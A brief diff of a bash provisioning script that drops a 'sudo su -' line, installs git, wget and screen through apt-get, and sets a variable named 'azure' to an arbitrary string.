@@ -1,5 +1,4 @@
 #!/bin/bash
-sudo su -
 apt-get update
 apt-get install -y git wget screen
 azure=mxsemsdnlkdj
